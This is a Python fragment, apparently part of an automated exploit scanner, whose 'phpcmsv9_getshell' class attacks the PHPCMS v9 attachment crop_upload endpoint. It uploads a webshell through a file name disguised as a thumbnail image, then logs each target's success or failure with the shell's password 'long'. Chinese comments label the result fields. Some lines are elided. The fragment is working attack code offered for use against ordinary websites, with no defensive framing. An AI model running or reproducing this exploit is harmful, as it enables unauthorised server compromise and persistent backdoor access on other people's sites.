...
class phpcmsv9_getshell(threading.Thread):
    ...
    def getshell(self,arg):
        try:
            ...
            url = arg.split('//')[1]
            site = '/index.php?m=attachment&c=attachments&a=crop_upload&width=6&height=6&file='+self.url+'/uploadfile/1222.thumb_.Php.JPG%20%20%20%20%20%20%20Php'
            conn = httplib.HTTPConnection(url)
            conn.request('POST',site,data,headers)
            httpres = conn.getresponse()
            html = httpres.read()
            ...
            if httpres.status == 200 and html:
                ...
                if get:
                    ...
                    #是
                        EXP_list=[1,self.url,"exp","CN_exp_phpcmsv9_getshell",data,"long","webshell"]
                        #["一句话 是否成功0否 1是","网址","严重程度","漏洞类型","漏洞地址","密码","备注"]7个
                        url_exp.put(EXP_list,0.5)   #插入队列
                    else:
                    #否
                        EXP_list=[0,self.url,"exp","CN_exp_phpcmsv9_getshell",data,"long","webshell"]
                        #["一句话 是否成功0否 1是","网址","严重程度","漏洞类型","漏洞地址","密码","备注"]7个
                        url_exp.put(EXP_list,0.5)   #插入队列
